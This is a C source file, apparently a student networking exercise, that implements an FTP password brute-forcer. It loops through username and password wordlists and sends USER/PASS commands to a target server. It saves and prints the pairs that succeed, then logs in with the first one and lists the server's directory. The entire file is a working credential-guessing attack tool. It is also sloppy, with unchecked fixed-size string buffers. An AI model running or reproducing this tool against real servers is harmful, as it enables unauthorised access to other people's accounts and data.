#include <stdio.h>      											/* for printf() and fprintf() */
#ifdef _WIN32
#include <winsock2.h>                                               /* for winsock 2 library which replace socket.h and inet.h */
#include <ws2tcpip.h>                                               /* for defined constants */
                                                                    /* ADD ws2_32.a to the 'linker settings' in 'build options' for Windows Compilation */
#else
#include <sys/socket.h> 											/* for socket(), connect(), send(), and recv() */
#include <arpa/inet.h>  											/* for sockaddr_in and inet_addr() */
#endif
#include <stdlib.h>     											/* for atoi() and exit() */
#include <string.h>     											/* for memset() */
#include <unistd.h>     										    /* for close() */
#include "Utils.h"
#include "HandleTCPServer.h"

/*
 * This implementation is not a good example in terms of error handling or sequence control, this assumes everything is working okay
 */

void HandleTCPServer(int sock,char * servIP, unsigned short servPort,char * userdir,char * passdir) {
    int dataSock = 0;
    int first = 0;      //flag which is set upon encountering first successful credentials    
    FILE *fpu = fopen(userdir,"r");  //file pointer to access the usernames.txt file
    FILE *fpp = fopen(passdir,"r"); //file pointer to access the passwords.txt file
    printf("%s %s",userdir,passdir);
    FILE *fps = fopen("success.txt","w+");   //file to store successful credentials.
    char temp[50],tempp[50];     //for storing data read from the two files.
    printf("%s",temp);
    char sucu[50],sucp[50];     // stores the first successful username and password
    int countc=0,countin=0;    // no of correct and incorrect attempts
    /* Receive Header (assuming single line header)*/
    receiveMessage(sock,srvBuf,sizeof(srvBuf));
    printf("[%d] %s",returnCode(srvBuf),srvBuf);
    if (returnCode(srvBuf) != 220) errorMessage("FTP Header Error!");
/* send username */
while(fscanf(fpu,"%s",temp)==1)
    {
            printf("---%s---@@",temp);
    strcpy(clntBuf,"USER ");                           //appending USER to username to send request.
    printf("for user %s\n",temp);
    strcat(clntBuf,temp);
    strcat(clntBuf,"\n");
    strcpy(temp,clntBuf);
    while(fscanf(fpp,"%s",tempp)==1)
    {
    strcpy(clntBuf,temp);
    sendMessage(sock,clntBuf,strlen(clntBuf));       
    /* response to USER command */
   receiveMessage(sock,srvBuf,sizeof(srvBuf));
    printf("[%d] %s",returnCode(srvBuf),srvBuf);
    if (returnCode(srvBuf) != 331) 
    {      //  errorMessage("Password Not Requested!");
          sock = createAndConnectSocket(servIP, servPort);            // reconnect if connection is lost
          receiveMessage(sock,srvBuf,sizeof(srvBuf));
          if (returnCode(srvBuf) != 220) errorMessage("FTP Header Error!");
          fseek(fpp,-strlen(tempp),SEEK_CUR);
          continue; 
   }/* send password */
    printf("trying %s\n",tempp);
    strcpy(clntBuf,"PASS ");                                 //appending PASS to send password
    strcat(clntBuf,tempp);
    strcat(clntBuf,"\n");
    sendMessage(sock,clntBuf,strlen(clntBuf));
    /* receive password response */
    receiveMessage(sock,srvBuf,sizeof(srvBuf));
    printf("[%d] %s",returnCode(srvBuf),srvBuf);
    if (returnCode(srvBuf) != 230) 
    {
            //errorMessage("Password Failed!");              //if incorrect increase countin
            countin++;
            continue;
    }
    else
    {
            fprintf(fps,"%s%s",temp,clntBuf);
            if(first==0)
            {                               // set first flag and store the credentials in sucu and sucp
            strcpy(sucu,temp);
            strcpy(sucp,clntBuf);
            first=1;
            }
            countc++;
            strcpy(clntBuf,"QUIT\n");                    //disconnect and continue with other combination
            sendMessage(sock,clntBuf,strlen(clntBuf));
            /* QUIT Response */
           receiveMessage(sock,srvBuf,sizeof(srvBuf));
            printf("[%d] %s",returnCode(srvBuf),srvBuf);
            break;
    }
    }
    rewind(fpp);
    }
    rewind(fps);
    printf("No of Correct attempts: %d\nNo of Incorrect attempts: %d\n",countc,countin);        //display no of correct and incorrect attempts
    fclose(fpu);
    fclose(fpp);
    printf("==============================================================================\n\t\t\tSUCCESSFUL ATTEMPTS\n\n");
    while(!feof(fps))
    {
            memset(temp,0,strlen(temp));
            memset(tempp,0,strlen(tempp));
            fscanf(fps,"%s%s",temp,tempp);
            printf("\t\t\t%s\t%s\n",temp,tempp);
    }
    printf("==============================================================================\n");
    fclose(fps);
    close(sock);
    /*reconnect with successful credentials*/
    sock = createAndConnectSocket(servIP , servPort);
    receiveMessage(sock,srvBuf,sizeof(srvBuf));
    if (returnCode(srvBuf) != 220) errorMessage("FTP Header Error!");
    strcpy(clntBuf,sucu);
    sendMessage(sock,clntBuf,strlen(clntBuf));
    /* response to USER command */
    receiveMessage(sock,srvBuf,sizeof(srvBuf));
    printf("[%d] %s",returnCode(srvBuf),srvBuf);
    strcpy(clntBuf,sucp);
    sendMessage(sock,clntBuf,strlen(clntBuf));
    /* response to USER command */
    receiveMessage(sock,srvBuf,sizeof(srvBuf));
    printf("[%d] %s",returnCode(srvBuf),srvBuf);
    /* Enter passive mode so client established data stream connection */
    strcpy(clntBuf,"PASV\n");
    sendMessage(sock,clntBuf,strlen(clntBuf));

    /* Server responds with Passive Details */
    receiveMessage(sock,srvBuf,sizeof(srvBuf));
    printf("[%d] %s",returnCode(srvBuf),srvBuf);

    if (returnCode(srvBuf) != 227) errorMessage("PASV Failed!");

    processPASV(srvBuf, clntBuf, &port);
    printf(" == PASV FTP Data Connection: Server [%s] Port [%d] ==\n", clntBuf, port);

    /* create passive data stream */
    dataSock = createAndConnectSocket(clntBuf, port);

    /* send list command */
    strcpy(clntBuf,"LIST\n");
    sendMessage(sock,clntBuf,strlen(clntBuf));

    /* receive response through command stream */
    receiveMessage(sock,srvBuf,sizeof(srvBuf));
    printf("[%d] %s",returnCode(srvBuf),srvBuf);
    if (returnCode(srvBuf) != 150) errorMessage("LIST Start Error!");

    /* Receive Data */
    msgSize = receiveData(dataSock, srvBuf, sizeof(srvBuf));
    /* close datastream after usage */
    close(dataSock);

    /* Data stream details and content */
    printf("Message Size:%d\n", msgSize);
    printf("==============================================================================\n\t\t\tCONTENTS\n\n");
    {
    int r=0,temp;
    float n;
    long sizeTot=0,fileSize;
    char fileorDir[50],gar1[50],gar2[50],gar3[50],gar4[50],gar5[50],gar6[50],fileName[50];
    FILE *fpr =fopen("received.txt","r"); 
    while(fscanf(fpr,"%s %s %s %s %ld %s %s %s %s",fileorDir,gar1,gar2,gar3,&fileSize,gar4,gar5,gar6,fileName)==9)
        {
            if(fileorDir[0]=='d')
                    printf("\t\tdirectory\t");
            else if(fileorDir[0]=='-')
                    printf("\t\tfile\t\t");
            printf("%s\n",fileName);
           sizeTot+=fileSize; 
        }
    printf("\nTOTAL SIZE: %ld KiloBytes\n",sizeTot);

    printf("==============================================================================\n");
    }
    /* Command stream response */
    receiveMessage(sock,srvBuf,sizeof(srvBuf));
    printf("[%d] %s",returnCode(srvBuf),srvBuf);
    if (returnCode(srvBuf) != 226) errorMessage("LIST End Error!");

    /* complete transaction */
    strcpy(clntBuf,"QUIT\n");
    sendMessage(sock,clntBuf,strlen(clntBuf));
    /* QUIT Response */
    receiveMessage(sock,srvBuf,sizeof(srvBuf));
    printf("[%d] %s",returnCode(srvBuf),srvBuf);
    if (returnCode(srvBuf) != 221) errorMessage("Quit Error!");
    system("rm success.txt");
    system("rm temp.txt");
    system("rm received.txt");
}

